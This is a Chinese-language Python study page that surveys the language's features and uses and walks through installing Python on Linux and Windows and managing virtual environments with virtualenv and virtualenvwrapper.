<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>python</title>
<link href="vendors/public.css" rel="stylesheet" type="text/css">
</head>
<body>
<ol>
	<li>
		<a href="#python">python ▼</a>
		<ul>
			<li><a href="#env">env</a></li>
			<li><a href="#commandline">commandline</a></li>
			<li><a href="#logging">logging</a></li>
			<li><a href="#pdb">pdb</a></li>
			<li><a href="#unittest">unittest</a></li>
			<li><a href="#doctest">doctest</a></li>
		</ul>
	</li>
	<li><a href="#syntax">syntax</a></li>
	<li>
		<a href="#var_type">变量类型 ▼</a>
		<ul>
			<li><a href="#seq">seq</a></li>
			<li><a href="#number">number</a></li>
			<li><a href="#string">string</a></li>
			<li><a href="#bytes">bytes</a></li>
			<li><a href="#bool">bool</a></li>
			<li><a href="#list">list</a></li>
			<li><a href="#tuple">tuple</a></li>
			<li><a href="#dictionary">dictionary</a></li>
			<li><a href="#set">set</a></li>
			<li><a href="#translate">translate</a></li>
		</ul>
	</li>
	<li><a href="#operator">operator</a></li>
	<li>
		<a href="#flow_control">流程控制 ▼</a>
		<ul>
			<li><a href="#if">if</a></li>
			<li><a href="#sanyuan">三元运算符</a></li>
			<li><a href="#xunhuan">for while</a></li>
			<li><a href="#Iterator">Iterator</a></li>
			<li><a href="#makelist">列表生成式</a></li>
			<li><a href="#generator">generator</a></li>
		</ul>
	</li>
	<li><a href="#function">function</a></li>
	<li>
		<a href="#hanshushi">函数式编程 ▼</a>
		<ul>
			<li><a href="#Higher-order">高阶函数</a></li>
			<li><a href="#backfunction">返回函数</a></li>
			<li><a href="#lambda">匿名函数 lambda</a></li>
			<li><a href="#decorator">装饰器 decorator</a></li>
			<li><a href="#partial">偏函数 partial</a></li>
		</ul>
	</li>
	<li>
		<a href="#module">module ▼</a>
		<ul>
			<li><a href="#package">package</a></li>
			<li><a href="#pip">pip</a></li>
			<li><a href="#import">import</a></li>
		</ul>
	</li>
	<li>
			<a href="#builtins">builtins ▼</a>
			<ul>
				<li><a href="#datetime">datetime</a></li>
				<li><a href="#time">time</a></li>
				<li><a href="#random">random</a></li>
				<li><a href="#sys">sys</a></li>
				<li><a href="#os">os</a></li>
				<li><a href="#json">json</a></li>
				<li><a href="#contextlib">contextlib</a></li>
				<li><a href="#collections">collections</a></li>
				<li><a href="#itertools">itertools</a></li>
				<li><a href="#functools">functools</a></li>
				<li><a href="#regexp">regexp</a></li>
				<li><a href="#base64">base64</a></li>
				<li><a href="#struct">struct</a></li>
				<li><a href="#hashlib">hashlib</a></li>
				<li><a href="#hmac">hmac</a></li>
				<li><a href="#gzip">gzip</a></li>
				<li><a href="#http">http</a></li>
				<li><a href="#urllib">urllib</a></li>
				<li><a href="#cookie">cookie</a></li>
				<li><a href="#lxml">lxml</a></li>
				<li><a href="#HTMLParser">HTMLParser</a></li>
			</ul>
	</li>
	<li>
		<a href="#Third-party">third-party ▼</a>
		<ul>
				<li><a href="#pillow">pillow</a></li>
				<li><a href="#requests">requests</a></li>
				<li><a href="#chardet">chardet</a></li>
				<li><a href="#psutil">psutil</a></li>
				<li><a href="#anaconda">anaconda</a></li>
				<li><a href="#numpy">numpy</a></li>
				<li><a href="#scipy">scipy</a></li>
				<li><a href="#matplotlib">matplotlib</a></li>
				<li><a href="#pandas">pandas</a></li>
				<li><a href="#scikit-learn">scikit-learn</a></li>
				<li><a href="#scikit-keras">scikit-keras</a></li>
				<li><a href="#excel">excel</a></li>
				<li><a href="#qrcode">qrcode</a></li>
		</ul>
	</li>
	<li><a href="#io">file I/O</a></li>
	<li><a href="#exception">exception</a></li>
	<li>
		<a href="#oop">OOP ▼</a>
		<ul>
				<li><a href="#extend">extend</a></li>
				<li><a href="#design">design</a></li>
		</ul>
	</li>
	<li>
		<a href="#database">database ▼</a>
		<ul>
				<li><a href="#SQLite">SQLite</a></li>
				<li><a href="#mysql">mysql</a></li>
				<li><a href="#sqlalchemy">sqlalchemy</a></li>
				<li><a href="#redis">redis</a></li>
		</ul>
	</li>
	<li><a href="#socket">socket</a></li>
	<li><a href="#smtp">SMTP</a></li>
	<li>
		<a href="#process_thread">process&thread</a>
		<ul>
				<li><a href="#thread">thread</a></li>
				<li><a href="#process">process</a></li>
		</ul>
	</li>
	<li>
			<a href="#gui">GUI</a>
			<ul>
				<li><a href="#manager">manager</a></li>
				<li><a href="#event">event</a></li>
				<li><a href="#vbar">vbar</a></li>
				<li><a href="#widget">widget</a></li>
				<li><a href="#turtle">turtle</a></li>
			</ul>
	</li>

	<li><a href="#cgi">CGI</a></li>
	<li><a href="#web">web</a></li>
	<li>
		<a href="#django">django ▼</a>
		<ul>
				<li><a href="#django_db">db</a></li>
				<li><a href="#django_view">view</a></li>
				<li><a href="#django_route">route</a></li>
				<li><a href="#django_request">request</a></li>
				<li><a href="#django_response">response</a></li>
				<li><a href="#django_form">form</a></li>
				<li><a href="#django_upload">upload</a></li>
				<li><a href="#django_csv_pdf">csv pdf</a></li>
				<li><a href="#django_template">template</a></li>
				<li><a href="#django_test">test</a></li>
				<li><a href="#django_static">static</a></li>
				<li><a href="#django_admin">admin</a></li>
				<li><a href="#django_setting">setting</a></li>
				<li><a href="#django_cookie_session">cookie session</a></li>
				<li><a href="#django_email">email</a></li>
				<li><a href="#django_sitemap">sitemap</a></li>
				<li><a href="#django_signal">signal</a></li>
				<li><a href="#django_serializers">serializers</a></li>
				<li><a href="#django_message">message</a></li>
				<li><a href="#django_paginator">paginator</a></li>
				<li><a href="#django_RSS/Atom">RSS/Atom</a></li>
				<li><a href="#django_logging">logging</a></li>
				<li><a href="#django_cache">cache</a></li>
				<li><a href="#django_auth">auth</a></li>
				<li><a href="#django_oauth">oauth</a></li>
				<li><a href="#django_translation">translation</a></li>
				<li><a href="#django_production">production</a></li>
		</ul>
	</li>
	<li>
		<a href="#flask">flask ▼</a>
		<ul>
			<li><a href="#flask_route">route</a></li>
			<li><a href="#flask_blueprint">blueprint</a></li>
			<li><a href="#flask_template">template</a></li>
			<li><a href="#flask_request">request</a></li>
			<li><a href="#flask_upload">upload</a></li>
			<li><a href="#flask_error">error</a></li>
			<li><a href="#flask_response">response</a></li>
			<li><a href="#flask_session">session</a></li>
			<li><a href="#flask_flash">flash</a></li>
			<li><a href="#flask_logging">logging</a></li>
			<li><a href="#flask_pdf">pdf</a></li>
			<li><a href="#flask_wsgi">wsgi</a></li>
			<li><a href="#flask_extension">extension</a></li>
			<li><a href="#flask_production">production</a></li>
		</ul>
	</li>
	<li>
		<a href="#asyncio">asyncio ▼</a>
		<ul>
			<li><a href="#aiohttp">aiohttp</a></li>
			<li><a href="#aiomysql">aiomysql</a></li>
		</ul>
	</li>
	<li><a href="#tornado">tornado</a></li>
	<li><a href="#websocket">websocket</a></li>
	<li><a href="#publish">打包和发布</a></li>
	<li><a href="#scrapy">scrapy</a></li>
	<li>
		<a href="#pygame">pygame ▼</a>
		<ul>
			<li><a href="#pygame_media">pygame_media</a></li>
			<li><a href="#pygame_event">pygame_event</a></li>
			<li><a href="#pygame_display">pygame_display</a></li>
			<li><a href="#pygame_font">pygame_font</a></li>
			<li><a href="#pygame_color">pygame_color</a></li>
			<li><a href="#pygame_img">pygame_img</a></li>
			<li><a href="#pygame_shape">pygame_shape</a></li>
			<li><a href="#pygame_move">pygame_move</a></li>
			<li><a href="#pygame_input">pygame_input</a></li>
		</ul>
	</li>
	<li><a href="#demo">demo</a></li>
</ol>

<h1 id="python">python <small>python安装目录下的帮助文件python\Doc\python374.chm和各模块的example、doc</small></h1>

<main>
<nav>
  <ul>
    <li class="home">
      <a href="#" onclick="location = location.hostname == 'localhost' ? '../' : './';return false;">STUDY</a>
    </li>
    <li class="it"><a href="javascript:;">python</a></li>
  </ul>
</nav>

<pre>
Python是一种解释型、面向对象、动态数据类型的高级程序设计语言,由Guido van Rossum于1989年底发明,第一个公开发行版发行于1991年。
像Perl语言一样,Python源代码同样遵循GPL(GNU General Public License)协议

jupyterlab notebook

TIOBE排行榜查看编程语言的大致流行程度
用任何编程语言来开发程序都是为了让计算机干活,比如下载一个MP3、编写一个文档等,而计算机工作的CPU只认识机器指令,所以尽管不同的编程语言差异极大,最后都得翻译成CPU可以执行的机器指令。不同的编程语言完成同样的任务,编写的代码量差距也很大,比如完成同一个任务,C语言要写1000行代码,Java只需要写100行,而Python可能只要20行,所以Python是一种相当高级的语言
代码少的代价是运行速度慢,C程序运行1秒钟,Java程序可能需要2秒,而Python程序可能就需要10秒。在非常高的抽象计算中,高级的Python程序设计也是非常难学的,所以高级程序语言不等于简单,但是对于初学者和完成普通任务,Python语言是非常简单易用的,连Google都在大规模使用Python
C语言是可以用来编写操作系统的贴近硬件的语言,所以C语言适合开发那些追求运行速度、充分发挥硬件性能的程序,而Python是用来编写应用程序的高级编程语言

Python是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。

Python的设计具有很强的可读性,相比其他语言经常使用英文关键字,其他语言的一些标点符号,它具有比其他语言更有特色语法结构
1、Python是一种解释型语言: 开发过程中没有了编译这个环节,类似于PHP和Perl语言。
2、Python是交互式语言: 可以在一个Python提示符>>>后直接执行代码。
3、Python是面向对象语言: 支持面向对象的风格或代码封装在对象的编程技术。
4、Python是初学者的语言:Python对初级程序员而言是一种伟大的语言,它支持广泛的应用程序开发,从简单的文字处理到WWW浏览器再到游戏。

Python特点
1.易学习:Python有相对较少的关键字,结构简单,和一个明确定义的语法,学习起来更加简单。
2.易阅读
3.易维护
4.一个广泛的标准库:Python的最大的优势之一是丰富的库,跨平台的,在UNIX,Windows和Macintosh兼容很好。
6.可移植:基于开源的特性,Python已经被移植到许多平台,Python是跨平台的,它可以运行在Windows、Mac和各种Linux/Unix系统上,在Windows上写Python程序放到Linux上也是能够运行的
5.互动模式的支持:可以从终端输入执行代码并获得结果的语言,互动的测试和调试代码片断。
7.可扩展:如果需要一段运行很快的关键代码或想编写一些不愿开放的算法,可以使用C或C++完成那部分程序,然后从Python程序中调用。
8.可嵌入:可以将Python嵌入到C/C++程序,让程序的用户获得"脚本化"的能力
9.数据库:Python提供所有主要的商业数据库的接口。
10.GUI编程:Python支持GUI可以创建和移植到许多系统调用。

用一种语言开始软件开发时,除了编写代码外,还需很多基本的已经写好的现成的东西来帮助加快开发进度。比如要编写一个电子邮件客户端,如果先从最底层开始编写网络协议相关的代码,那估计一年半载也开发不出来。高级编程语言通常都会提供一个比较完善的基础代码库提供直接调用,比如针对电子邮件协议的SMTP库,针对桌面环境的GUI库,在这些已有的代码库的基础上开发一个电子邮件客户端几天就能开发出来。
Python就提供了非常完善的基础代码库,覆盖了网络、文件、GUI、数据库、文本等大量内容,被形象地称作"内置电池(batteries included)"。用Python开发,许多功能不必从零编写,直接使用现成的即可。
除了内置的库外,Python还有大量的第三方库可以直接使用,如果开发的代码通过很好的封装也可以作为第三方库给别人使用。
许多大型网站就是用Python开发的如YouTube、Instagram,还有国内的豆瓣,很多大公司包括Google、Yahoo等,甚至NASA(美国航空航天局)都大量地使用Python。

Python的哲学就是简单优雅,尽量写容易看明白的代码,尽量写少的代码

Python适合开发哪些类型的应用呢？
首选是网络应用,包括网站、后台服务等等,很多著名的网站包括YouTube就是Python写的
其次是许多日常需要的小工具,包括系统管理员需要的脚本任务等等,可以做日常任务,比如自动备份MP3
另外就是把其他语言开发的程序再包装起来,方便使用
可以做网络游戏的后台,很多在线游戏的后台都是Python开发的

Python的缺点
第一个缺点就是运行速度慢,和C程序相比非常慢,因为Python是解释型语言,代码在执行时会一行一行地翻译成CPU能理解的机器码,这个翻译过程非常耗时,所以很慢。而C程序是运行前直接编译成CPU能执行的机器码,所以非常快。但是大量的应用程序不需要这么快的运行速度,因为用户根本感觉不出来。例如开发一个下载MP3的网络应用程序,C程序的运行时间需要0.001秒,而Python程序的运行时间需要0.1秒,慢了100倍,但由于网络更慢,需要等待1秒,用户能感觉不到1.001秒和1.1秒的区别

第二个缺点就是代码不能加密。如果要发布Python程序,实际上就是发布源代码,这一点跟C语言不同,C语言不用发布源代码,只需要把编译后的机器码(Windows上常见的xxx.exe文件)发布出去。要从机器码反推出C代码是不可能的,所以凡是编译型的语言都没有这个问题,而解释型的语言则必须把源码发布出去。
这个缺点仅限于要编写的软件需要卖给别人挣钱的时候。好消息是目前的互联网时代,靠卖软件授权的商业模式越来越少了,靠网站和移动应用卖服务的模式越来越多了,后一种模式不需要把源码给别人。
现在如火如荼的开源运动和互联网自由开放的精神是一致的,互联网上有无数非常优秀的像Linux一样的开源代码,千万不要高估自己写的代码真的有非常大的"商业价值"。那些大公司的代码不愿意开放的更重要的原因是代码写得太烂了,一旦开源就没人敢用他们的产品了

Python不适合的场景:比如写操作系统只能用C语言写,写手机应用只能用Swift/Objective-C(针对iPhone)和Java(针对Android),写3D游戏最好用C或C++

【 python应用 】
常规软件开发
Python支持函数式编程和OOP面向对象编程,能够承担任何种类软件的开发工作,因此常规的软件开发、脚本编写、网络编程等都属于标配能力。

Web应用开发、Web编程
Python经常被用于Web开发。比如通过mod_wsgi模块,Apache可以运行用Python编写的Web程序。Python定义了WSGI标准应用接口来协调Http服务器与基于Python的Web程序之间的通信。一些Web框架如Django、Tornado、Flask、TurboGears、web2py、Zope等可以让程序员轻松地开发和管理复杂的Web程序。

操作系统管理、系统编程(进程线程)、服务器运维的自动化脚本
提供API(Application Programming Interface应用程序编程接口),能方便进行系统维护和管理,Linux下标志性语言之一,是很多系统管理员理想的编程工具
在很多操作系统里Python是标准的系统组件,大多数Linux发行版及NetBSD、OpenBSD和MacOSX都集成了Python,可以在终端下直接运行Python。有一些Linux发行版的安装器使用Python语言编写,比如Ubuntu的Ubiquity安装器,RedHatLinux和Fedora的Anaconda安装器。GentooLinux使用Python来编写它的Portage包管理系统。Python标准库包含了多个调用操作系统功能的库。通过pywin32这个第三方软件包,Python能够访问Windows的COM服务及其它WindowsAPI。使用IronPython,Python程序能够直接调用.NetFramework。一般说来Python编写的系统管理脚本在可读性、性能、代码重用度、扩展性几方面都优于普通的shell脚本。

自动化运维
这几乎是Python应用的自留地,作为运维工程师首选的编程语言,Python在自动化运维方面已经深入人心,比如Saltstack和Ansible都是大名鼎鼎的自动化平台
运维自动化是一组将静态的设备结构转化为根据IT服务需求动态弹性响应的策略,目的是实现IT运维的质量,降低成本
自动化运维工具：部署类jenkins、环境类ansible、监控类ngios

科学计算、数学处理
随着NumPy,SciPy,Matplotlib,Enthoughtlibrarys等众多程序库的开发,Python越来越适合于做科学计算、绘制高质量的2D和3D图像,NumPy扩展提供大量与许多标准数学库的接口,可用来存储和处理大型矩阵,比Python自身的嵌套列表结构要高效的多
和科学计算领域最流行的商业软件Matlab相比,Python是一门通用的程序设计语言,比Matlab所采用的脚本语言的应用范围更广泛,有更多的程序库的支持。虽然Matlab中的许多高级功能和toolbox目前还是无法替代的,不过在日常的科研开发之中仍然有很多的工作是可以用Python代劳的。
NumPy通常与SciPy(Scientific Python)和Matplotlib(绘图库)一起使用,这种组合广泛用于替代MatLab,是一个强大的科学计算环境,有助于通过Python学习数据科学或机器学习。
SciPy是一个开源的Python算法库和数学工具包。
SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。
Matplotlib是Python编程语言及其数值数学扩展包NumPy的可视化操作界面。它为利用通用的图形用户界面工具包,如Tkinter,wxPython,Qt或GTK+向应用程序嵌入式绘图提供了应用程序接口(API)

云计算
开源云计算解决方案OpenStack就是基于Python开发的

桌面软件、图形处理
有PIL、Tkinter等图形库支持能方便进行图形处理,PyQt、PySide、wxPython、PyGTK是Python快速开发桌面应用程序的利器。

服务器软件(网络软件)
Python对于各种网络协议的支持很完善,因此经常被用于编写服务器软件、网络爬虫。第三方库Twisted支持异步网络编程和多数标准的网络协议(包含客户端和服务器),并且提供了多种工具,被广泛用于编写高性能的服务器软件。

网络爬虫
也称网络蜘蛛,是大数据行业获取数据的核心工具。没有网络爬虫自动地、不分昼夜地、高智能地在互联网上爬取免费的数据,那些大数据相关的公司恐怕要少四分之三。能够编写网络爬虫的编程语言有不少,但Python绝对是其中的主流之一,其Scrapy爬虫框架应用非常广泛

数据分析
在大量数据的基础上,结合科学计算、机器学习等技术,对数据进行清洗、去重、规格化和针对性的分析是大数据行业的基石。Python是数据分析的主流语言之一。
NumPy、SciPy、Pandas和Matplotlib库共同构成了Python数据分析的基础,当前它们已经成为SciPy Stack 1.0的组成部分
●NumPy：这是一个通用程序库,不仅支持常用的数值数组,同时提供了用于高效处理这些数组的函数。
●SciPy：这是Python的科学计算库,对NumPy的功能进行了大量扩充,同时也有部分功能是重合的。Numpy和SciPy曾经共享基础代码,后来分道扬镳了。
●Pandas：这是一个用于数据处理的程序库,不仅提供了丰富的数据结构,同时为处理数据表和时间序列提供了相应的函数。
●Matplotlib：这是一个2D绘图库,在绘制图形和图像方面提供了良好的支持。当前,Matplotlib已经并入SciPy中并支持NumPy。
●IPython：这个库为Python提供了强大的交互式Shell,也为Jupyter提供了内核,同时还支持交互式数据可视化功能
●Jupyter Notebook：它提供了一个基于Web的交互式shell,可以创建和共享支持可实时代码和可视化的文档。Jupyter Notebook通过IPython提供的内核支持多个版本的Python

人工智能
Python在人工智能大范畴领域内的机器学习、神经网络、深度学习等方面都是主流的编程语言,得到广泛的支持和应用。

游戏
很多游戏使用C++编写图形显示等高性能模块,而使用Python或Lua编写游戏的逻辑、服务器。相较于Python,Lua的功能更简单、体积更小;而Python则支持更多的特性和数据类型。

多媒体应用
Python的PyOpenGL模块封装了"OpenGL应用程序编程接口",能进行二维和三维图像处理。PyGame模块可用于编写游戏软件。

pymo引擎
PYMO全称为pythonmemoriesoff,是一款运行于SymbianS60V3,Symbian3,S60V5,Symbian3,Android系统上的AVG游戏引擎。因其基于python2.0平台开发,并且适用于创建秋之回忆(memoriesoff)风格的AVG游戏,故命名为PYMO。

文本处理
python提供的re模块能支持正则表达式,还提供SGML,XML分析模块,许多程序员利用python进行XML程序的开发。

数据库编程
程序员可通过遵循PythonDB-API(数据库应用程序编程接口)规范的模块与MicrosoftSQLServer,Oracle,Sybase,DB2,MySQL、SQLite等数据库通信。python自带有一个Gadfly模块,提供了一个完整的SQL环境。

网络编程
提供丰富的模块支持sockets编程,能方便快速地开发分布式应用程序。很多大规模软件开发计划例如Zope,Mnet及BitTorrent.Google都在广泛地使用它。

黑客编程
python有一个hack的库,内置了熟悉的或不熟悉的函数,但是缺少成就感。

构思实现,产品早期原型和迭代
YouTube、Google、Yahoo、NASA都在内部大量地使用Python。

</pre>

<div id="env">
<h3>本地搭建Python开发环境</h3><pre>
要使用Python编程,首先就得把Python安装到电脑里,安装后会得到Python解释器(就是负责运行Python程序的),一个命令行交互环境,还有一个简单的集成开发环境

电脑可以安装任意数量相同或不同版本的python,安装Python本质上就是在电脑上安装了一个有python.exe和各种子文件夹的文件夹

在Linux上安装Python
win10子系统Ubuntu16.04默认安装了Python3.6.7
$ python3

apt install python3.7
手动安装:
步骤1:在python官网找到python-3.7.1.tgz的地址:https://www.python.org/ftp/python/3.7.1/Python-3.7.1.tgz
步骤2:下载安装包,wget https://www.python.org/ftp/python/3.7.1/Python-3.7.1.tgz
步骤3:解压安装包,tar -zxvf Python-3.7.1.tgz
步骤4:切换到解压后的目录下,cd Python-3.7.1
步骤5:./configure(也可以./configure --prefix=/usr/local/python3.7.1)
步骤6:编译make,没有安装make的安装一下
步骤7:测试make test
步骤8:安装sudo make install
若步骤5执行的是 ./configure,则安装后可执行文件默认放在/usr /local/bin,库文件默认放在/usr/local/lib,配置文件默认放在/usr/local/include,其它的资源文件放在/usr /local/share。
若步骤5执行的是./configure --prefix=/usr/local/python3.7.1,则可执行文件放在/usr /local/python3.7.1/bin,库文件放在/usr/local/python3.7.1/lib,配置文件放在/usr/local/python3.7.1/include,其它的资源文件放在/usr /local/python3.7.1/share
步骤9:若步骤5执行./configure --prefix=/usr/local/python3.7.1,则需要添加环境变量。步骤5是./configure的跳过此步骤
添加环境变量
PATH=$PATH:$HOME/bin:/usr/local/python3.7.1/bin
查看环境变量
echo $PATH
步骤10:查看安装目录
可以看到此时python3.7安装到了/usr/local/lib/(若步骤5执行./configure --prefix=/usr/local/python3.7.1,python3.7安装到了/usr/local/python3.7.1/lib/)
步骤11:测试,输入python3.7

</pre>python中获取python版本号的方法<textarea>
# 方法一
>>> import platform
>>> print(platform.python_version())
3.6.3

# 方法二
import sys
print(sys.version)
print(sys.version_info)

# 方法三
>>> import sys
>>> print(sys.version)
3.6.3 (v3.6.3:2c5fed8, Oct  3 2017, 18:11:49) [MSC v.1900 64 bit (AMD64)]
>>> print(sys.version_info)
sys.version_info(major=3, minor=6, micro=3, releaselevel='final', serial=0)
>>> print(sys.version_info.major)
3
　　
</textarea><pre>
更新python默认指向为python3.7
步骤1:查看python命令指向,ls -l /usr/bin | grep python
步骤2:若如步骤1的图,若要安装python3.4则,由于python3.4为系统自带的,直接使用以下命令并跳过步骤3
删除原有链接
rm /usr/bin/python
建立新链接
ln -s /usr/bin/python3.4 /usr/bin/python
步骤3:由于python3.7是自己安装的,不在/usr/bin下,而在usr/local/bin或者/usr/local/python3.7.1/bin下(取决于前面执行的./configure还是./configure --prefix=/usr/local/python3.7.1。因此需要先加一条软链接并且把之前的python命令改为python.bak,同时pip也需要更改。依次执行以下命令
若python3.7安装时,执行的是./configure,则:
mv /usr/bin/python /usr/bin/python.bak
ln -s /usr/local/bin/python3 /usr/bin/python
mv /usr/bin/pip /usr/bin/pip.bak
ln -s /usr/local/bin/pip3 /usr/bin/pip
若python3.7安装时,执行的是./configure --prefix=/usr/local/python3.7.1,则为:
mv /usr/bin/python /usr/bin/python.bak
ln -s /usr/local/python3.7.1/bin/python3.7 /usr/bin/python
mv /usr/bin/pip /usr/bin/pip.bak
ln -s /usr/local/python3.7.1/bin/pip3 /usr/bin/pip

步骤4:此时输入python验证

【 在Windows上安装Python 】
首先根据Windows版本(64位还是32位)从Python的官方网站下载Python 3.7对应的64位安装程序或32位安装程序(网速慢的移步国内镜像),Download Windows x86-64 executable installer,然后运行下载的EXE安装包,特别要注意勾上AddPython3.7 to PATH,然后点"Install Now"即可完成安装

windows从3.3版本开始Python launcher会伴随解释器的安装而可选安装,在安装步骤的可选项中可勾选
Python launcher通过在命令行输入py命令代替python命令,默认Python launcher打开了最新版本的解释器
如果系统环境中有多个版本的Python解释器,则可以通过下列方式指定python解释器的版本
py -2
py -2.7 -V
py -3 -V
py -3.6 -V
py -3.7 -V
也可以在.py文件头加入#! python2.7或#! python3来指定python解释器的版本,命令行则直接执行py test.py即可
也可以通过py -3.7 test.py

编写Python代码时得到的是一个包含Python代码的以.py为扩展名的文本文件,要运行代码就需要Python解释器去执行.py文件
从Python官方网站下载并安装好Python3.x后就直接获得了一个官方版本的解释器:CPython,这个解释器是用C语言开发的,所以叫CPython。在命令行下运行python就是启动CPython解释器,CPython是使用最广的Python解释器

Python可应用于多平台包括Linux和Mac OS X,可以通过终端窗口输入python命令来查看本地是否已经安装Python以及Python的安装版本

Python环境变量,它应用于Python:
PYTHONPATH: PYTHONPATH是Python搜索路径,默认import的模块都会从PYTHONPATH里面寻找
PYTHONSTARTUP: Python启动后先寻找PYTHONSTARTUP环境变量,然后执行此变量指定的文件中的代码
PYTHONCASEOK: 加入PYTHONCASEOK的环境变量,就会使python导入模块的时候不区分大小写
PYTHONHOME: 另一种模块搜索路径,通常内嵌于的PYTHONSTARTUP或PYTHONPATH目录中,使得两个模块库更容易切换

</pre>

<h4>Python创建virtualenv(虚拟环境) virtualenv/venv</h4><pre>
python版本比较多,2和3相差非常大,很多项目需要跑在同一台服务器上,可以选择直接运行,也可以选择使用docker。如果用docker那就不需要隔离环境了,如果要直接运行在服务器上,那就必须有隔离环境。比如有的项目使用python 3.5,有的项目使用python 3.7,此时可以借助虚拟环境帮助完美的隔离环境,让多个版本的python没有任何冲突,完美共存

如果要同时开发多个应用程序,那这些应用程序都会共用一个Python,就是安装在系统的Python3。如果应用A需要jinja2.7,而应用B需要jinja2.6,这种情况下每个应用可能需要各自拥有一套"独立"的Python运行环境

Python应用程序通常会使用不在标准库内的软件包和模块。应用程序有时需要特定版本的库,因为应用程序可能需要修复特定的错误,或者可以使用库的过时版本的接口编写应用程序。
这意味着一个Python安装可能无法满足每个应用程序的要求。如果应用程序A需要特定模块的1.0版本但应用程序B需要2.0版本,则需求存在冲突,安装版本1.0或2.0将导致某一个应用程序无法运行。
这个问题的解决方案是创建一个virtual environment的目录,其中安装有特定Python版本及许多其他包,然后不同的应用将可以使用不同的虚拟环境。 要解决先前需求相冲突的例子,应用程序A可以拥有自己的安装了1.0版本的虚拟环境,而应用程序B则拥有安装了2.0版本的另一个虚拟环境。 如果应用程序B要求将某个库升级到3.0版本,也不会影响应用程序A的环境。

虚拟环境的作用是:搭建独立的python运行环境,不与其他产生冲突
安装在虚拟环境里的所有包,均不会对环境外的其他包产生影响,反之,在虚拟环境下运行时只能调用虚拟环境中安装的包,不会调用外部的包。比如,mac系统自带python2,搭建了虚拟环境安装python3,那么在虚拟环境内安装的pip install pandas后,在环境外运行python时,import pandas是会报错的

虚拟环境有助于包的管理和防止版本冲突
便于包管理:有时要做数据分析就需要相关的包比如pandas,有时需要做分词就需要jieba,有时要画图就需要matploylib,只需要其中一个包,其余用不到,那么建立虚拟环境后只要下载相应的包即可
避免版本冲突:在某些时候在开发时,有时需要调用2.7的包,有时需要调用3.6的包,那么就可以通过独立的环境运行,从而完成这项工作避免了冲突

虚拟环境的作用是使得不同项目的Python包之间不会相互干扰,每个虚拟环境都可以安装一套独立的第三方模块,避免了由此产生的各种问题,同时也方便程序往其他机器上迁移。

【 virtualenv 】
virtualenv是目前最流行的python虚拟环境配置工具,不仅同时支持python2和python3,而且可以为每个虚拟环境指定python解释器,并选择不继承基础版本的包
virtualenv为应用提供了隔离的Python运行环境,解决了不同应用间多版本的冲突问题

安装:
pip3 install virtualenv
创建虚拟环境,命名为env_django:
(1)virtualenv env_django(创建虚拟环境)
(2)virtualenv --no-site-packages env_django(创建纯净环境)
--no-site-packages已安装到系统Python环境中的所有第三方包都不会复制过来,这就得到了一个不带任何第三方包的"干净"的Python运行环境
(2)virtualenv --system-site-packages env_django(创建环境,继承原安装的模块)
激活该虚拟环境:
windows进到目录里的Script文件夹输入:activate
linux:source env_django/bin/activate
此时命令提示符变了,有个(env_django)前缀,表示当前环境是一个名为env_django的Python环境
退出虚拟环境:
deactivate
(Linux) env_django/bin/deactivate
(Windows) env_django\Scripts\deactivate.bat

指定python版本
virtualenv -p /usr/bin/python2.7 my_project
或者在环境变量配置中加入
export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python2.7

virtualenv常用命令选项
virtualenv [OPTIONS] DEST_DIR

Options:
–version　　　　　显示版本信息。
-h, –help　　　　 显示帮助信息。
-v, –verbose　　　增加后台输出的信息。
-q, –quiet　　　　控制后台输出的信息。
-p PYTHON_EXE, –python=PYTHON_EXE　 指定Python解释器
–clear　　　　　　清除虚拟环境中依赖库,初始化环境。
–system-site-packages 使用当前Python主体上已安装的程序库。
–always-copy　　　一概不使用符号链接,直接复制文件。
–no-setuptools　Do not install setuptools in the new virtualenv.
–no-pip　　　　　Do not install pip in the new virtualenv.
–no-wheel　　　　Do not install wheel in the new virtualenv.

假定要开发一个新的项目,需要一套独立的Python运行环境,可以这么做:

第一步,创建目录:
$ mkdir myproject
$ cd myproject/

第二步,创建一个独立的Python运行环境,命名为venv:
$ virtualenv --no-site-packages venv
命令virtualenv就可以创建一个独立的Python运行环境,还加上了参数--no-site-packages,这样已经安装到系统Python环境中的所有第三方包都不会复制过来,这样就得到了一个不带任何第三方包的"干净"的Python运行环境。

新建的Python环境被放到当前目录下的venv目录。有了venv这个Python环境,可以用source进入该环境:
$ source venv/bin/activate
(venv)$
注意到命令提示符变了,有个(venv)前缀,表示当前环境是一个名为venv的Python环境。

下面正常安装各种第三方包,并运行python命令:
(venv)$ pip install jinja2
在venv环境下,用pip安装的包都被安装到venv这个环境下,系统Python环境不受任何影响。也就是说,venv环境是专门针对myproject这个应用创建的。

退出当前的venv环境,使用deactivate命令:
(venv)$ deactivate
此时就回到了正常的环境,现在pip或python均是在系统Python环境下执行。

完全可以针对每个应用创建独立的Python运行环境,这样就可以对每个应用的Python环境进行隔离。

virtualenv是如何创建"独立"的Python运行环境的呢？原理很简单,就是把系统Python复制一份到virtualenv的环境,用命令source venv/bin/activate进入一个virtualenv环境时,virtualenv会修改相关环境变量,让命令python和pip均指向当前的virtualenv环境。

【 virtualenvwrapper 】
virtualenv的扩展包,能方便的管理virtualenv
virtualenvwrapper
virtualenvwrapper是对virtualenv的一个封装,目的是使后者更好用。
关于为什么使用shell脚本开发,作者专门进行了解释 。
virtualenvwrapper还有针对vim用户和emacs用户的扩展 。
virtualenvwrapper能支持bash/ksh/zsh ,所以它不支持Windows。

virtualenvwrapper-win
由于virtualenvwrapper基于shell开发,因此不能在Windows系统上使用,但可以使用针对Windows batch shell的virtualenvwrapper-win。

安装
环境变量 WORKON_HOME 指定虚拟环境位置
(Linux)
pip install virtualenvwrapper
export WORKON_HOME=~/Envs
source /usr/local/bin/virtualenvwrapper.sh
(Windows)
pip install virtualenvwrapper-win
WORKON_HOME 默认值是 %USERPROFILE%Envs

创建虚拟环境
mkvirtualenv myenv

切换到虚拟环境
workon myenv

虚拟环境和项目分开
mkproject my_project
虚拟环境在 WORKON_HOME 中,项目在 PROJECT_HOME 中

退出虚拟环境
deactivate

删除虚拟环境
rmvirtualenv myenv

其它用法
lsvirtualenv 列举所有的环境。
cdvirtualenv [subdir] 导航到当前激活的虚拟环境的目录中
cdsitepackages [subdir] 和上面的类似,但是是直接进入到 site-packages 目录中
lssitepackages 显示 site-packages 目录中的内容
